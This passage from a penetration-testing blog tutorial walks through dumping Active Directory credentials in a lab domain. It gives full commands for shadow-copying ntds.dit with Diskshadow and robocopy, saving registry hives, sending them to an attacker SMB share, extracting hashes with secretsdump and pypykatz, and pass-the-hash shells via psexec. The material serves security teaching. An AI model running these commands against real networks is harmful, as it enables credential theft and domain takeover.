+<p><span style="color: #000000">To test if the <strong data-start="1693" data-end="1707">Aarav user</strong> has the <strong data-start="1716" data-end="1737">SeBackupPrivilege</strong>, we first connect to the <strong data-start="1763" data-end="1781">target machine</strong> using <strong data-start="1788" data-end="1802">Evil-WinRM</strong>. Then, we run the <code data-start="1825" data-end="1839">whoami /priv</code> command to verify the privileges. As shown below, the user <strong data-start="1903" data-end="1912">Aarav</strong> indeed has the <strong data-start="1928" data-end="1949">SeBackupPrivilege</strong> and <strong data-start="1954" data-end="1976">SeRestorePrivilege</strong> enabled.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">evil-winrm -i 192.168.1.48 -u aarav –p "Password@1"
+whoami /priv</pre>
+<p><span style="color: #000000"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTyPmZgLTqzf9-qau8DFRxGCkoaPRkwLY8-CCoBkb5cGpjVbPNpWOnmjDQjweLWgj12u9q1IYAmy5KXON6lSBYQnIoo85v6TDB_drsj4JxDntP-edfWt-6Usza17Zy6W1TEme6UmAT-fsKcHs7Y6iZG5GnRqFUKsjaHb-7_78kE3xbsFYuR_HGT4CPBLbt/s16000/24.png"/></strong></span></p>
+<h5><strong><span style="color: #000000">Creating and Using a Volume Shadow Copy</span></strong></h5>
+<p data-start="966" data-end="1348"><span style="color: #000000">In the next phase, to extract <strong data-start="1000" data-end="1015">NTLM hashes</strong> from the <strong data-start="1025" data-end="1046">Domain Controller</strong>, we require both the <strong data-start="1068" data-end="1085">ntds. dit file</strong> and the <strong data-start="1094" data-end="1109">SYSTEM hive</strong>. <strong data-start="1111" data-end="1122">However</strong>, since <strong data-start="1130" data-end="1142">ntds. dit</strong> remains locked while the system is running; conventional copying fails. <strong data-start="1215" data-end="1235">To overcome this</strong>, we utilize <strong data-start="1248" data-end="1262">Diskshadow</strong>, a built-in <strong data-start="1275" data-end="1291">Windows tool</strong>, to create a <strong data-start="1305" data-end="1327">volume shadow copy</strong> of the <strong data-start="1335" data-end="1347">C: drive</strong>.</span></p>
+<p data-start="1350" data-end="1671"><span style="color: #000000">Instead of running commands manually in the <strong data-start="1398" data-end="1418">Diskshadow shell</strong>, we create a <strong data-start="1432" data-end="1465">Distributed Shadow File (dsh)</strong> to automate the process. This file instructs <strong data-start="1511" data-end="1525">Diskshadow</strong> to create a shadow copy of <strong data-start="1553" data-end="1559">C:</strong> as <strong data-start="1563" data-end="1575">Z: drive</strong>. <strong data-start="1577" data-end="1597">Before executing</strong>, we convert the file to a <strong data-start="1624" data-end="1653">Windows-compatible format</strong> using. <code data-start="1660" data-end="1670">unix2dos</code>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano raj.dsh
+set context persistent nowriters
+add volume c: alias raj
+create
+expose %raj% z:
+unix2dos raj.dsh</pre>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgLxE1uywE-5q1Z4ww4fu6Y_T0aM-yKSkNd2Xp1UV6kdiCmFgvnNyGmFijA6hyphenhyphenU4M_ePcSGpEXD8l1siovG25HBEv6gtoPY0iyDdeBdpK7U9C_Biue2El15e-EE8MLE178Mn4HUUsdaQn0KD9Clce_6hszSmKvfMcfBTE-nOE-dQbSfPlRuJjFnSW_nH7vj/s16000/25.png" alt="AddSelf Active Directory Abuse" width="572" height="213"/></span></p>
+<p><span style="color: #000000">In the <strong data-start="1803" data-end="1820">WinRM session</strong>, we navigate to the <strong data-start="1841" data-end="1859">Temp directory</strong> and upload the <code data-start="1875" data-end="1884">raj.dsh</code> file to the <strong data-start="1897" data-end="1915">target machine</strong>. Next, we run <strong data-start="1934" data-end="1948">Diskshadow</strong> with the script, which sequentially executes commands to mount a shadow copy of <strong data-start="2029" data-end="2035">C:</strong> as <strong data-start="2039" data-end="2045">Z:</strong>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd C:Temp
+upload raj.dsh
+diskshadow /s raj.dsh</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEilV7awpkNgBJJxNee70Ytcob38cwXB_G3H0ZToIvHJ5s35849knNHlovkbAMr1mmfeKCD5zHQtOtdyfAcXiNAPSedEAMtcKDGCvS2L_fZ0bq7tKv64Qr0O82mp1lc6cW5rzfS-xLQvBNaWEWZyVGyxS4TXOCykFvl9ntlNGgq3J0KjVJfFeXCx24UDi4HQ/s16000/26.png"/></span></p>
+<p><span style="color: #000000">Use <strong>RoboCopy</strong> to transfer the <strong>ntds. dit</strong> file from <strong>Z</strong> to the <strong>Temp</strong> directory.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">robocopy /b z:windowsntds . ntds.dit</pre>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgaBINyo-a8REZZIrnbM5WBOMG3yLTXm39s6uT7ts1_yuNSnphGVzCyRbSYZXgOmfUKQYKa3SU94yP0qwyyresFZfyX_QskPl34Yo2oR2sPXZ2XXAF9RQZH0uUQwkwEEcHY8gZSUyIXTYA_gBjlEgByKHpN3hlpZCSosWTJqvsCY8kbAgi9prYb9SGZiRG_/s16000/27.png" alt="AddSelf Active Directory Abuse" width="804" height="424"/></span></p>
+<p><span style="color: #000000">With the <strong data-start="2975" data-end="2992">ntds..dit file</strong> obtained, we extract the <strong data-start="3018" data-end="3033">SYSTEM hive</strong> using the <code data-start="3044" data-end="3054">reg save</code> command. <strong data-start="3064" data-end="3071">Now</strong>, both files are located in the <strong data-start="3103" data-end="3121">Temp directory</strong> and can be transferred to <strong data-start="3148" data-end="3162">Kali Linux</strong> using the <code data-start="3173" data-end="3183">download</code> command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">reg save hklmsystem c:Tempsystem
+download ntds.dit
+download system</pre>
+<p><span style="color: #000000"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhtubNkw9guivGv5By69gt6RMhy2FihSMB6GUAJWtZFG-EW5wdGHbbAONIPph135KKu8Jzcn2egIqg2ytgvC4QiriapU0UY6tRAAsWwCRNUOJn7b0mSFbl6euyzxQDsrFf_lhTDZ5S93DqXpS23JeoiLBeK38PJTpkVZeeCkPcMqCjfOIqqjvMu1uqSADp0/s16000/28.png"/></strong></span></p>
+<h5 data-start="2571" data-end="2626"><strong><span style="color: #000000">Extracting Hashes and Gaining Administrative Access</span></strong></h5>
+<p data-start="2628" data-end="2775"><span style="color: #000000">Finally, on the <strong data-start="2644" data-end="2664">Kali Linux shell</strong>, use <strong data-start="2670" data-end="2696">Impacket’s secretsdump</strong> to extract <strong data-start="2708" data-end="2727">password hashes</strong> from the <strong data-start="2737" data-end="2754">ntds.dit file</strong> and <strong data-start="2759" data-end="2774">SYSTEM hive</strong>:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-secretsdump -ntds ntds.dit -system system local</pre>
+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiYfGTcFXrb_SkyKMrq_2tjjG6jtQHlWpHwUHCYcVKEc85574rXx-sSIlG6XYRUzwqQfUWvrSmSA8Lfeja76BXMNg7FQfI9BNG5oCtn9FpPyf7eQMsDZP3sJYYPSxQBOeiRRRVLmiFL3fqFNygh_Ln1rI37PZKA35ermVkTFR2CRK8Yp_-UFZkwI7XLKNxE/s16000/29.png" alt="AddSelf Active Directory Abuse" width="836" height="630"/></span></p>
+<p><span style="color: #000000">As illustrated below, the <strong data-start="2877" data-end="2909">Administrator account hashes</strong> were successfully extracted. Use <strong data-start="2943" data-end="2957">Evil-WinRM</strong> to log in as <strong data-start="2971" data-end="2988">Administrator</strong> using the extracted hash, thereby achieving <strong data-start="3033" data-end="3057">privilege escalation</strong> on the <strong data-start="3065" data-end="3094">Windows Domain Controller</strong>.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjrUVWUOCdRf4AoVlGypQ-EFVjMXkP4F3QwjRK2K7vVFb3xSBVK8bgHx8K2nBcsYYh1EYZAp9YDj_VUQhlEfm8EJBzgLUQZzStjPudjY3uxweXhWqjEEopFEwGmHY2lVyFKbB3spYxx3VEbmOV-GyoXXRhy-pO3sD091vtS8BdgLNDZ3SgDXFFkLRptpTzh/s16000/30.png"/></span></p>
+<h3><span style="color: #800000">Alternate method of dumping hashes with Impacket</span></h3>
+<p><span style="color: #000000">Alternatively, attackers can use a different technique to dump <strong data-start="325" data-end="344">password hashes,</strong> leveraging <strong data-start="356" data-end="368">Impacket</strong> and <strong data-start="373" data-end="385">pypykatz</strong> tools.</span></p>
+<p><span style="color: #000000">First, set up an SMB share on your attacker machine using the <strong>impacket-smbserver.</strong> This share will store the <strong data-start="555" data-end="580">dumped registry files</strong>.<br/>
+</span></p>
+<p><span style="color: #000000">Run the following command on your Kali machine:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-smbserver share $(pwd) -smb2support</pre>
+<p><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhSt5suLkP88CDdHShFnl6jpXecRKDH3aoFGM67HBsdrSDjOcQiDfZcRuODHafUM5iqihGP3Dp2LMejsQkCoAKJE0WRCtuCE_Hj3WH9bJ54O7iNgTk4YybqIrrJFyMChkQ92Yiu1TaodHkf2pVuuhktNuP-gG5pTpyMsJij0sieAQcpKsbot1NMAjRcpDNk/s16000/31.png" alt="AddSelf Active Directory Abuse" width="732" height="204"/></p>
+<p><span style="color: #000000">Next, dump the <strong>SAM</strong> and <strong>SYSTEM hives</strong> from the target machine, using the <strong>impacket-reg</strong> tool.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-reg "ignite.local"/"aarav":"Password@1"@"192.168.1.48" backup -o '\192.168.1.40share'</pre>
+<p><span style="color: #000000"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj2RMz9crMMJjMqriZZ-iz0PFl7OqcoCZOFsOZoJyDhrpC09KtBK-3-z2m8l2IQCZmrWv7gwZZ8fw_o4MsfRkRipysW4jdQPyET-v1uF_IxxznZ75gPQEq0V1p7vs-U-ij3w4jFwzvcLC0DPn8ylmg-ZNTQzXiywY5YVRmmHO9NM1wWPRGgoW6PH6RxT_Uu/s16000/32.png"/></strong></span></p>
+<p><span style="color: #000000">Then, use <strong data-start="1110" data-end="1122">pypykatz</strong> to extract <strong data-start="1134" data-end="1158">NTLM password hashes</strong> from the dumped <strong data-start="1175" data-end="1182">SAM</strong> and <strong data-start="1187" data-end="1197">SYSTEM</strong> files:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">pypykatz registry --sam SAM.save SYSTEM.save</pre>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhlYWmMbC0zfGgugQ2rHgJq9KsMY6noYi_fA8ocyyFi_Sq6NFoCWn3hPcWsoyuxboNE2b__5PkXUWXSu6j82Pa74I4gh6q1lx9WkeZ38J_9wBmfJjzix8XrxY3QWSEaWqpKmry9Iy3elJIDokSaKnyRiisJR-e6pZj_chyphenhyphenRlVpBfc_ChdNPMAk-h_a-xu8S/s16000/33.png"/></p>
+<p><span style="color: #000000">Finally, use <strong>impacket-psexec</strong> to gain a shell on the target machine as an administrator user using the extracted hash, achieving <strong>privilege escalation</strong> on the <strong>Windows Domain Controller</strong>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:32196b56ffe6f45e294117b91a83bf38 administrator@192.168.1.48</pre>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEijLZmNx0qfOOIWXhPQcpp2c9qlsnQWHA6ceav44zO-ipOC_5A6c6NPh7YkGJsmZKtBy-pQFbfmLM2yWoNyO5b8T_UXlNAHHJP5U4VMmjxzVV96GyMOaDzRwSHgvKsCA2UxQc360ej4rDxDbNhthHZM6rEKFepkcxFptQjaPZRCQOo7SiJn4BkPTMWzMkUi/s16000/34.png"/></p>
+<p><span style="color: #000000">This grants <strong data-start="1593" data-end="1618">remote code execution</strong> on the <strong data-start="1626" data-end="1647">Domain Controller</strong>, completing the <strong data-start="1664" data-end="1688">privilege escalation</strong> process.</span></p>
+<h3><span style="color: #800000">Detection &amp; Mitigation</span></h3>
+<p><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEja3bUwmVYsTOluHeOnuGcWVdcl8sj7UFIjihMuv6amgXyjcIS72NClOdb39fyBpGBGEi_CUtc1HPHcyavs3O7xg7FvTsA9DTIUz1GTCw42DGPYONNhqfFJSeyicoqRbFw7_akU2P0X6nWrhPb3UGY5vh0_7KWzEFA9VAJjhIHDWdoHCBUsiZk31PAmXabg/s16000/Detection%20&amp;%20Mitigation%20Attack%20MITRE%20ATT&amp;CK%20Technique%20Description%20Detection%20Mitigation%20Reset%20Password%20T1110.001%20%E2%80%93%20Password%20Cracking%20Attackers%20with%20Generic%20ALL%20permissions%20can%20reset%20the%20target%20user%E2%80%99%20(1).png" alt="AddSelf Active Directory Abuse" width="3005" height="4250"/></p>
+<p><span style="color: #000000"><strong>Author</strong>: Pradnya Pawar is an InfoSec researcher and Security Tech Lead. Contact </span><a href="https://www.linkedin.com/in/pradnya-pawar-12bb4844"><strong>here</strong></a></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
+<!-- YARPP Thumbnails -->
+<h3>Related posts:</h3>
+<div class="yarpp-thumbnails-horizontal">
+<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/allextendedrights-active-directory-abuse/" title="Abusing AD-DACL: AllExtendedRights">
+<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">Abusing AD-DACL: AllExtendedRights</span></a>
+<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/genericwrite-active-directory-abuse/" title="Abusing AD-DACL: GenericWrite">
+<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">Abusing AD-DACL: GenericWrite</span></a>
+</div>
+</div>
+            </div><!-- .entry-content -->
+            <footer class="post-footer entry-footer">
+                                                
+            </footer><!-- .entry-footer -->
+            
+	<nav class="navigation post-navigation" aria-label="Posts">
+		<h2 class="screen-reader-text">Post navigation</h2>
+		<div class="nav-links"><div class="nav-previous"><a href="https://www.hackingarticles.in/active-directory-pentesting-using-netexec-tool-a-complete-guide/" rel="prev">Active Directory Pentesting Using Netexec Tool</a></div><div class="nav-next"><a href="https://www.hackingarticles.in/diamond-ticket-attack-abusing-kerberos-trust/" rel="next">Diamond Ticket Attack: Abusing kerberos Trust</a></div></div>
+	</nav>        </div>
